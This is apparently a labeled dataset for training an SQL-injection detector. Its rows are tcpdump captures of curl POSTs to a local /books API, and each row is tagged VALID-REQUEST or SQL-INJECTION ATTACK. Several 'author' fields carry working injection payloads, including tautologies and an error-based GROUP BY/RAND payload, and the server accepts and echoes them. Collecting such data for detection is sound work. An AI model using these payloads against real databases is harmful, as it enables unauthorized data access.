,raw_sql,predict_val
1980,"17:27:31.519831 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43630 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xb43a), seq 247, ack 256, win 350, options [nop,nop,TS val 2265591 ecr 2265591], length 0",VALID-REQUEST
1981,"17:27:31.520118 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43630 > ::1.8080: Flags [F.], cksum 0x0028 (incorrect -> 0xb438), seq 247, ack 256, win 350, options [nop,nop,TS val 2265592 ecr 2265591], length 0",VALID-REQUEST
1982,"17:27:31.520781 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43630: Flags [F.], cksum 0x0028 (incorrect -> 0xb436), seq 256, ack 248, win 350, options [nop,nop,TS val 2265592 ecr 2265592], length 0",VALID-REQUEST
1983,"17:27:31.520800 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43630 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xb436), seq 248, ack 257, win 350, options [nop,nop,TS val 2265592 ecr 2265592], length 0",VALID-REQUEST
1984,"17:27:31.531894 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.43632 > ::1.8080: Flags [S], cksum 0x0030 (incorrect -> 0x9509), seq 3004890872, win 43690, options [mss 65476,sackOK,TS val 2265603 ecr 0,nop,wscale 7], length 0",VALID-REQUEST
1985,"17:27:31.531929 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.8080 > ::1.43632: Flags [S.], cksum 0x0030 (incorrect -> 0xf0c4), seq 1350418831, ack 3004890873, win 43690, options [mss 65476,sackOK,TS val 2265604 ecr 2265603,nop,wscale 7], length 0",VALID-REQUEST
1986,"17:27:31.531951 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43632 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xc2f5), seq 1, ack 1, win 342, options [nop,nop,TS val 2265604 ecr 2265604], length 0",VALID-REQUEST
1987,"17:27:31.532041 IP6 (hlim 64, next-header TCP (6) payload length: 255) ::1.43632 > ::1.8080: Flags [P.], cksum 0x0107 (incorrect -> 0xbb9e), seq 1:224, ack 1, win 342, options [nop,nop,TS val 2265604 ecr 2265604], length 223: HTTP, length: 223",VALID-REQUEST
1988,POST /books HTTP/1.1,VALID-REQUEST
1989,User-Agent: curl/7.29.0,VALID-REQUEST
1990,Host: localhost:8080,VALID-REQUEST
1991,Accept: */*,VALID-REQUEST
1992,Content-type:application/json,VALID-REQUEST
1993,Content-Length: 88,VALID-REQUEST
1994,"{""name"":""Hackathon-Demo28"",""author"":""Ramesh-1969%') OR 1943=1943-- dJSs"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
1995,"17:27:31.532059 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43632: Flags [.], cksum 0x0028 (incorrect -> 0xc20e), seq 1, ack 224, win 350, options [nop,nop,TS val 2265604 ecr 2265604], length 0",VALID-REQUEST
1996,"17:27:31.536666 IP6 (hlim 64, next-header TCP (6) payload length: 260) ::1.8080 > ::1.43632: Flags [P.], cksum 0x010c (incorrect -> 0x0a2a), seq 1:229, ack 224, win 350, options [nop,nop,TS val 2265608 ecr 2265604], length 228: HTTP, length: 228",VALID-REQUEST
1997,HTTP/1.1 201,VALID-REQUEST
1998,Content-Type: application/json;charset=UTF-8,VALID-REQUEST
1999,Transfer-Encoding: chunked,VALID-REQUEST
2000,"Date: Thu, 27 Jun 2019 17:27:31 GMT",VALID-REQUEST
2001,5e,VALID-REQUEST
2002,"{""id"":64,""name"":""Hackathon-Demo28"",""author"":""Ramesh-1969%') OR 1943=1943-- dJSs"",""price"":9.99}",SQL-INJECTION ATTACK
2003,"17:27:31.536684 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43632 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xc122), seq 224, ack 229, win 350, options [nop,nop,TS val 2265608 ecr 2265608], length 0",VALID-REQUEST
2004,"17:27:31.537069 IP6 (hlim 64, next-header TCP (6) payload length: 37) ::1.8080 > ::1.43632: Flags [P.], cksum 0x002d (incorrect -> 0x7cfa), seq 229:234, ack 224, win 350, options [nop,nop,TS val 2265609 ecr 2265608], length 5: HTTP",VALID-REQUEST
2005,"17:27:31.537087 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43632 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xc11b), seq 224, ack 234, win 350, options [nop,nop,TS val 2265609 ecr 2265609], length 0",VALID-REQUEST
2006,"17:27:31.537488 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43632 > ::1.8080: Flags [F.], cksum 0x0028 (incorrect -> 0xc11a), seq 224, ack 234, win 350, options [nop,nop,TS val 2265609 ecr 2265609], length 0",VALID-REQUEST
2007,"17:27:31.538125 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43632: Flags [F.], cksum 0x0028 (incorrect -> 0xc118), seq 234, ack 225, win 350, options [nop,nop,TS val 2265610 ecr 2265609], length 0",VALID-REQUEST
2008,"17:27:31.538144 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43632 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xc117), seq 225, ack 235, win 350, options [nop,nop,TS val 2265610 ecr 2265610], length 0",VALID-REQUEST
2009,"17:27:31.546568 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.43634 > ::1.8080: Flags [S], cksum 0x0030 (incorrect -> 0x1a08), seq 3871491649, win 43690, options [mss 65476,sackOK,TS val 2265618 ecr 0,nop,wscale 7], length 0",VALID-REQUEST
2010,"17:27:31.546587 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.8080 > ::1.43634: Flags [S.], cksum 0x0030 (incorrect -> 0x185b), seq 231432604, ack 3871491650, win 43690, options [mss 65476,sackOK,TS val 2265618 ecr 2265618,nop,wscale 7], length 0",VALID-REQUEST
2011,"17:27:31.546601 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43634 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xea8c), seq 1, ack 1, win 342, options [nop,nop,TS val 2265618 ecr 2265618], length 0",VALID-REQUEST
2012,"17:27:31.546665 IP6 (hlim 64, next-header TCP (6) payload length: 263) ::1.43634 > ::1.8080: Flags [P.], cksum 0x010f (incorrect -> 0x66e8), seq 1:232, ack 1, win 342, options [nop,nop,TS val 2265618 ecr 2265618], length 231: HTTP, length: 231",VALID-REQUEST
2013,POST /books HTTP/1.1,VALID-REQUEST
2014,User-Agent: curl/7.29.0,VALID-REQUEST
2015,Host: localhost:8080,VALID-REQUEST
2016,Accept: */*,VALID-REQUEST
2017,Content-type:application/json,VALID-REQUEST
2018,Content-Length: 96,VALID-REQUEST
2019,"{""name"":""Hackathon-Demo29"",""author"":""Ramesh-1969%'))) OR 3191=4443 AND ((('%'='"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
2020,"17:27:31.546675 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43634: Flags [.], cksum 0x0028 (incorrect -> 0xe99d), seq 1, ack 232, win 350, options [nop,nop,TS val 2265618 ecr 2265618], length 0",VALID-REQUEST
2021,"17:27:31.551217 IP6 (hlim 64, next-header TCP (6) payload length: 268) ::1.8080 > ::1.43634: Flags [P.], cksum 0x0114 (incorrect -> 0xec5f), seq 1:237, ack 232, win 350, options [nop,nop,TS val 2265623 ecr 2265618], length 236: HTTP, length: 236",VALID-REQUEST
2022,HTTP/1.1 201,VALID-REQUEST
2023,Content-Type: application/json;charset=UTF-8,VALID-REQUEST
2024,Transfer-Encoding: chunked,VALID-REQUEST
2025,"Date: Thu, 27 Jun 2019 17:27:31 GMT",VALID-REQUEST
2026,66,VALID-REQUEST
2027,"{""id"":65,""name"":""Hackathon-Demo29"",""author"":""Ramesh-1969%'))) OR 3191=4443 AND ((('%'='"",""price"":9.99}",SQL-INJECTION ATTACK
2028,"17:27:31.551236 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43634 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xe8a7), seq 232, ack 237, win 350, options [nop,nop,TS val 2265623 ecr 2265623], length 0",VALID-REQUEST
2029,"17:27:31.551610 IP6 (hlim 64, next-header TCP (6) payload length: 37) ::1.8080 > ::1.43634: Flags [P.], cksum 0x002d (incorrect -> 0xa480), seq 237:242, ack 232, win 350, options [nop,nop,TS val 2265623 ecr 2265623], length 5: HTTP",VALID-REQUEST
2030,"17:27:31.551627 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43634 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xe8a2), seq 232, ack 242, win 350, options [nop,nop,TS val 2265623 ecr 2265623], length 0",VALID-REQUEST
2031,"17:27:31.552265 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43634 > ::1.8080: Flags [F.], cksum 0x0028 (incorrect -> 0xe8a0), seq 232, ack 242, win 350, options [nop,nop,TS val 2265624 ecr 2265623], length 0",VALID-REQUEST
2032,"17:27:31.553473 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43634: Flags [F.], cksum 0x0028 (incorrect -> 0xe89d), seq 242, ack 233, win 350, options [nop,nop,TS val 2265625 ecr 2265624], length 0",VALID-REQUEST
2033,"17:27:31.553499 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43634 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xe89c), seq 233, ack 243, win 350, options [nop,nop,TS val 2265625 ecr 2265625], length 0",VALID-REQUEST
2034,"17:27:31.562991 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.43636 > ::1.8080: Flags [S], cksum 0x0030 (incorrect -> 0xadcd), seq 3819222406, win 43690, options [mss 65476,sackOK,TS val 2265635 ecr 0,nop,wscale 7], length 0",VALID-REQUEST
2035,"17:27:31.563022 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.8080 > ::1.43636: Flags [S.], cksum 0x0030 (incorrect -> 0xbe9c), seq 3175128985, ack 3819222407, win 43690, options [mss 65476,sackOK,TS val 2265635 ecr 2265635,nop,wscale 7], length 0",VALID-REQUEST
2036,"17:27:31.563043 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43636 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x90ce), seq 1, ack 1, win 342, options [nop,nop,TS val 2265635 ecr 2265635], length 0",VALID-REQUEST
2037,"17:27:31.563129 IP6 (hlim 64, next-header TCP (6) payload length: 254) ::1.43636 > ::1.8080: Flags [P.], cksum 0x0106 (incorrect -> 0xcf77), seq 1:223, ack 1, win 342, options [nop,nop,TS val 2265635 ecr 2265635], length 222: HTTP, length: 222",VALID-REQUEST
2038,POST /books HTTP/1.1,VALID-REQUEST
2039,User-Agent: curl/7.29.0,VALID-REQUEST
2040,Host: localhost:8080,VALID-REQUEST
2041,Accept: */*,VALID-REQUEST
2042,Content-type:application/json,VALID-REQUEST
2043,Content-Length: 87,VALID-REQUEST
2044,"{""name"":""Hackathon-Demo30"",""author"":""Ramesh-1976"") OR 7547=7547-- mTUA"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
2045,"17:27:31.563141 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43636: Flags [.], cksum 0x0028 (incorrect -> 0x8fe8), seq 1, ack 223, win 350, options [nop,nop,TS val 2265635 ecr 2265635], length 0",VALID-REQUEST
2046,"17:27:31.566335 IP6 (hlim 64, next-header TCP (6) payload length: 124) ::1.8080 > ::1.43636: Flags [P.], cksum 0x0084 (incorrect -> 0x3b3b), seq 1:93, ack 223, win 350, options [nop,nop,TS val 2265638 ecr 2265635], length 92: HTTP, length: 92",VALID-REQUEST
2047,HTTP/1.1 400,VALID-REQUEST
2048,Content-Length: 0,VALID-REQUEST
2049,"Date: Thu, 27 Jun 2019 17:27:31 GMT",VALID-REQUEST
2050,Connection: close,VALID-REQUEST
2051,"17:27:31.566349 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43636 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x8f8e), seq 223, ack 93, win 342, options [nop,nop,TS val 2265638 ecr 2265638], length 0",VALID-REQUEST
2052,"17:27:31.566485 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43636: Flags [F.], cksum 0x0028 (incorrect -> 0x8f85), seq 93, ack 223, win 350, options [nop,nop,TS val 2265638 ecr 2265638], length 0",VALID-REQUEST
2053,"17:27:31.567181 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43636 > ::1.8080: Flags [F.], cksum 0x0028 (incorrect -> 0x8f8b), seq 223, ack 94, win 342, options [nop,nop,TS val 2265639 ecr 2265638], length 0",VALID-REQUEST
2054,"17:27:31.567197 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43636: Flags [.], cksum 0x0028 (incorrect -> 0x8f82), seq 94, ack 224, win 350, options [nop,nop,TS val 2265639 ecr 2265639], length 0",VALID-REQUEST
2055,"17:27:31.577393 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.43638 > ::1.8080: Flags [S], cksum 0x0030 (incorrect -> 0xdc08), seq 2225268285, win 43690, options [mss 65476,sackOK,TS val 2265649 ecr 0,nop,wscale 7], length 0",VALID-REQUEST
2056,"17:27:31.577421 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.8080 > ::1.43638: Flags [S.], cksum 0x0030 (incorrect -> 0x4422), seq 2253356850, ack 2225268286, win 43690, options [mss 65476,sackOK,TS val 2265649 ecr 2265649,nop,wscale 7], length 0",VALID-REQUEST
2057,"17:27:31.577439 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43638 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x1654), seq 1, ack 1, win 342, options [nop,nop,TS val 2265649 ecr 2265649], length 0",VALID-REQUEST
2058,"17:27:31.577520 IP6 (hlim 64, next-header TCP (6) payload length: 247) ::1.43638 > ::1.8080: Flags [P.], cksum 0x00ff (incorrect -> 0x2311), seq 1:216, ack 1, win 342, options [nop,nop,TS val 2265649 ecr 2265649], length 215: HTTP, length: 215",VALID-REQUEST
2059,POST /books HTTP/1.1,VALID-REQUEST
2060,User-Agent: curl/7.29.0,VALID-REQUEST
2061,Host: localhost:8080,VALID-REQUEST
2062,Accept: */*,VALID-REQUEST
2063,Content-type:application/json,VALID-REQUEST
2064,Content-Length: 80,VALID-REQUEST
2065,"{""name"":""Hackathon-Demo31"",""author"":""Ramesh-1983' OR 1598=4389#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
2066,"17:27:31.577532 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43638: Flags [.], cksum 0x0028 (incorrect -> 0x1575), seq 1, ack 216, win 350, options [nop,nop,TS val 2265649 ecr 2265649], length 0",VALID-REQUEST
2067,"17:27:31.591001 IP6 (hlim 64, next-header TCP (6) payload length: 252) ::1.8080 > ::1.43638: Flags [P.], cksum 0x0104 (incorrect -> 0x69c7), seq 1:221, ack 216, win 350, options [nop,nop,TS val 2265663 ecr 2265649], length 220: HTTP, length: 220",VALID-REQUEST
2068,HTTP/1.1 201,VALID-REQUEST
2069,Content-Type: application/json;charset=UTF-8,VALID-REQUEST
2070,Transfer-Encoding: chunked,VALID-REQUEST
2071,"Date: Thu, 27 Jun 2019 17:27:31 GMT",VALID-REQUEST
2072,56,VALID-REQUEST
2073,"{""id"":66,""name"":""Hackathon-Demo31"",""author"":""Ramesh-1983' OR 1598=4389#"",""price"":9.99}",SQL-INJECTION ATTACK
2074,"17:27:31.591022 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43638 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x147d), seq 216, ack 221, win 350, options [nop,nop,TS val 2265663 ecr 2265663], length 0",VALID-REQUEST
2075,"17:27:31.591346 IP6 (hlim 64, next-header TCP (6) payload length: 37) ::1.8080 > ::1.43638: Flags [P.], cksum 0x002d (incorrect -> 0xd055), seq 221:226, ack 216, win 350, options [nop,nop,TS val 2265663 ecr 2265663], length 5: HTTP",VALID-REQUEST
2076,"17:27:31.591360 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43638 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x1478), seq 216, ack 226, win 350, options [nop,nop,TS val 2265663 ecr 2265663], length 0",VALID-REQUEST
2077,"17:27:31.596168 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43638 > ::1.8080: Flags [F.], cksum 0x0028 (incorrect -> 0x1472), seq 216, ack 226, win 350, options [nop,nop,TS val 2265668 ecr 2265663], length 0",VALID-REQUEST
2078,"17:27:31.596814 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43638: Flags [F.], cksum 0x0028 (incorrect -> 0x146c), seq 226, ack 217, win 350, options [nop,nop,TS val 2265668 ecr 2265668], length 0",VALID-REQUEST
2079,"17:27:31.596832 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43638 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x146c), seq 217, ack 227, win 350, options [nop,nop,TS val 2265668 ecr 2265668], length 0",VALID-REQUEST
2080,"17:59:59.556936 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.43824 > ::1.8080: Flags [S], cksum 0x0030 (incorrect -> 0x61e1), seq 2654899365, win 43690, options [mss 65476,sackOK,TS val 4213629 ecr 0,nop,wscale 7], length 0",VALID-REQUEST
2081,"17:59:59.556965 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.8080 > ::1.43824: Flags [S.], cksum 0x0030 (incorrect -> 0x23af), seq 2322753521, ack 2654899366, win 43690, options [mss 65476,sackOK,TS val 4213629 ecr 4213629,nop,wscale 7], length 0",VALID-REQUEST
2082,"17:59:59.556984 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43824 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xf5e0), seq 1, ack 1, win 342, options [nop,nop,TS val 4213629 ecr 4213629], length 0",VALID-REQUEST
2083,"17:59:59.557082 IP6 (hlim 64, next-header TCP (6) payload length: 428) ::1.43824 > ::1.8080: Flags [P.], cksum 0x01b4 (incorrect -> 0x145f), seq 1:397, ack 1, win 342, options [nop,nop,TS val 4213629 ecr 4213629], length 396: HTTP, length: 396",VALID-REQUEST
2084,POST /books HTTP/1.1,VALID-REQUEST
2085,User-Agent: curl/7.29.0,VALID-REQUEST
2086,Host: localhost:8080,VALID-REQUEST
2087,Accept: */*,VALID-REQUEST
2088,Content-type:application/json,VALID-REQUEST
2089,Content-Length: 260,VALID-REQUEST
2090,"{""name"":""Hackathon-Demo0"",""author"":""RameshAND ROW(4115,7844)>(SELECT COUNT(*),CONCAT(0x717a786271,(SELECT (ELT(4115=4115,1))),0x7176767871,FLOOR(RAND(0)*2))x FROM (SELECT 9757 UNION SELECT 8982 UNION SELECT 5308 UNION SELECT 5233)a GROUP BY x)"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
2091,"17:59:59.557096 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43824: Flags [.], cksum 0x0028 (incorrect -> 0xf44c), seq 1, ack 397, win 350, options [nop,nop,TS val 4213629 ecr 4213629], length 0",VALID-REQUEST
2092,"17:59:59.562219 IP6 (hlim 64, next-header TCP (6) payload length: 433) ::1.8080 > ::1.43824: Flags [P.], cksum 0x01b9 (incorrect -> 0x6725), seq 1:402, ack 397, win 350, options [nop,nop,TS val 4213634 ecr 4213629], length 401: HTTP, length: 401",VALID-REQUEST
2093,HTTP/1.1 201,VALID-REQUEST
2094,Content-Type: application/json;charset=UTF-8,VALID-REQUEST
2095,Transfer-Encoding: chunked,VALID-REQUEST
2096,"Date: Thu, 27 Jun 2019 17:59:59 GMT",VALID-REQUEST
2097,10a,VALID-REQUEST
2098,"{""id"":67,""name"":""Hackathon-Demo0"",""author"":""RameshAND ROW(4115,7844)>(SELECT COUNT(*),CONCAT(0x717a786271,(SELECT (ELT(4115=4115,1))),0x7176767871,FLOOR(RAND(0)*2))x FROM (SELECT 9757 UNION SELECT 8982 UNION SELECT 5308 UNION SELECT 5233)a GROUP BY x)"",""price"":9.99}",SQL-INJECTION ATTACK
2099,"17:59:59.562238 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43824 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xf2b1), seq 397, ack 402, win 350, options [nop,nop,TS val 4213634 ecr 4213634], length 0",VALID-REQUEST
2100,"17:59:59.562561 IP6 (hlim 64, next-header TCP (6) payload length: 37) ::1.8080 > ::1.43824: Flags [P.], cksum 0x002d (incorrect -> 0xae8a), seq 402:407, ack 397, win 350, options [nop,nop,TS val 4213634 ecr 4213634], length 5: HTTP",VALID-REQUEST
2101,"17:59:59.562577 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43824 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xf2ac), seq 397, ack 407, win 350, options [nop,nop,TS val 4213634 ecr 4213634], length 0",VALID-REQUEST
2102,"17:59:59.562955 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43824 > ::1.8080: Flags [F.], cksum 0x0028 (incorrect -> 0xf2aa), seq 397, ack 407, win 350, options [nop,nop,TS val 4213635 ecr 4213634], length 0",VALID-REQUEST
2103,"17:59:59.564285 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43824: Flags [F.], cksum 0x0028 (incorrect -> 0xf2a7), seq 407, ack 398, win 350, options [nop,nop,TS val 4213636 ecr 4213635], length 0",VALID-REQUEST
2104,"17:59:59.564302 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43824 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xf2a6), seq 398, ack 408, win 350, options [nop,nop,TS val 4213636 ecr 4213636], length 0",VALID-REQUEST
2105,"17:59:59.573303 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.43826 > ::1.8080: Flags [S], cksum 0x0030 (incorrect -> 0x777a), seq 1429979133, win 43690, options [mss 65476,sackOK,TS val 4213645 ecr 0,nop,wscale 7], length 0",VALID-REQUEST
2106,"17:59:59.573327 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.8080 > ::1.43826: Flags [S.], cksum 0x0030 (incorrect -> 0x93af), seq 3888361512, ack 1429979134, win 43690, options [mss 65476,sackOK,TS val 4213645 ecr 4213645,nop,wscale 7], length 0",VALID-REQUEST
2107,"17:59:59.573345 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43826 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x65e1), seq 1, ack 1, win 342, options [nop,nop,TS val 4213645 ecr 4213645], length 0",VALID-REQUEST
2108,"17:59:59.573429 IP6 (hlim 64, next-header TCP (6) payload length: 228) ::1.43826 > ::1.8080: Flags [P.], cksum 0x00ec (incorrect -> 0x698e), seq 1:197, ack 1, win 342, options [nop,nop,TS val 4213645 ecr 4213645], length 196: HTTP, length: 196",VALID-REQUEST
2109,POST /books HTTP/1.1,VALID-REQUEST
2110,User-Agent: curl/7.29.0,VALID-REQUEST
2111,Host: localhost:8080,VALID-REQUEST
2112,Accept: */*,VALID-REQUEST
2113,Content-type:application/json,VALID-REQUEST
2114,Content-Length: 61,VALID-REQUEST
2115,"{""name"":""Hackathon-Demo1"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
2116,"17:59:59.573443 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43826: Flags [.], cksum 0x0028 (incorrect -> 0x6515), seq 1, ack 197, win 350, options [nop,nop,TS val 4213645 ecr 4213645], length 0",VALID-REQUEST
2117,"17:59:59.577562 IP6 (hlim 64, next-header TCP (6) payload length: 233) ::1.8080 > ::1.43826: Flags [P.], cksum 0x00f1 (incorrect -> 0x7e85), seq 1:202, ack 197, win 350, options [nop,nop,TS val 4213649 ecr 4213645], length 201: HTTP, length: 201",VALID-REQUEST
2118,HTTP/1.1 201,VALID-REQUEST
2119,Content-Type: application/json;charset=UTF-8,VALID-REQUEST
2120,Transfer-Encoding: chunked,VALID-REQUEST
2121,"Date: Thu, 27 Jun 2019 17:59:59 GMT",VALID-REQUEST
2122,43,VALID-REQUEST
2123,"{""id"":68,""name"":""Hackathon-Demo1"",""author"":""Ramesh-P"",""price"":9.99}",VALID-REQUEST
2124,"17:59:59.577592 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43826 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x6444), seq 197, ack 202, win 350, options [nop,nop,TS val 4213649 ecr 4213649], length 0",VALID-REQUEST
2125,"17:59:59.578057 IP6 (hlim 64, next-header TCP (6) payload length: 37) ::1.8080 > ::1.43826: Flags [P.], cksum 0x002d (incorrect -> 0x201c), seq 202:207, ack 197, win 350, options [nop,nop,TS val 4213650 ecr 4213649], length 5: HTTP",VALID-REQUEST
2126,"17:59:59.578090 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43826 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x643d), seq 197, ack 207, win 350, options [nop,nop,TS val 4213650 ecr 4213650], length 0",VALID-REQUEST
2127,"17:59:59.578166 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43826 > ::1.8080: Flags [F.], cksum 0x0028 (incorrect -> 0x643c), seq 197, ack 207, win 350, options [nop,nop,TS val 4213650 ecr 4213650], length 0",VALID-REQUEST
2128,"17:59:59.578357 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43826: Flags [F.], cksum 0x0028 (incorrect -> 0x643b), seq 207, ack 198, win 350, options [nop,nop,TS val 4213650 ecr 4213650], length 0",VALID-REQUEST
2129,"17:59:59.578391 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43826 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x643b), seq 198, ack 208, win 350, options [nop,nop,TS val 4213650 ecr 4213650], length 0",VALID-REQUEST
2130,"17:59:59.587776 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.43828 > ::1.8080: Flags [S], cksum 0x0030 (incorrect -> 0x0f2f), seq 1834160161, win 43690, options [mss 65476,sackOK,TS val 4213659 ecr 0,nop,wscale 7], length 0",VALID-REQUEST
2131,"17:59:59.587793 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.8080 > ::1.43828: Flags [S.], cksum 0x0030 (incorrect -> 0xc82c), seq 1420863077, ack 1834160162, win 43690, options [mss 65476,sackOK,TS val 4213659 ecr 4213659,nop,wscale 7], length 0",VALID-REQUEST
2132,"17:59:59.587806 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43828 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x9a5e), seq 1, ack 1, win 342, options [nop,nop,TS val 4213659 ecr 4213659], length 0",VALID-REQUEST
2133,"17:59:59.587897 IP6 (hlim 64, next-header TCP (6) payload length: 239) ::1.43828 > ::1.8080: Flags [P.], cksum 0x00f7 (incorrect -> 0x3fc3), seq 1:208, ack 1, win 342, options [nop,nop,TS val 4213660 ecr 4213659], length 207: HTTP, length: 207",VALID-REQUEST
2134,POST /books HTTP/1.1,VALID-REQUEST
2135,User-Agent: curl/7.29.0,VALID-REQUEST
2136,Host: localhost:8080,VALID-REQUEST
2137,Accept: */*,VALID-REQUEST
2138,Content-type:application/json,VALID-REQUEST
2139,Content-Length: 72,VALID-REQUEST
